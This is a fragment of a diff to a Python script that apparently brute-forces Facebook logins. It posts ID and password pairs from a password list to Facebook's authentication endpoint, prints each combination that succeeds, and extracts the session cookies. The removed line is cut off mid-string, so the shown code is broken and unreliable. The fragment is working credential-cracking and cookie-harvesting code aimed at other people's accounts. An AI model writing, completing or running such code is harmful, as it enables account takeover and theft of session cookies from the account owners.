@@ -512,7 +512,6 @@ def api1(ids,names,passlist):
                                 }
                         url = 'https://graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
-                        if 'session 
                                         print(f'\r\r\x1b[38;5;244m(\x1b[38;5;46mCTG-OK\x1b[38;5;244m)\x1b[38;5;46m '+ids+f' ━\x1b[38;5;244m➤\x1b[38;5;46m '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r\x1b[38;5;244m=(\x1b[38;5;46m💥\x1b[38;5;244m)={A} "+coki)
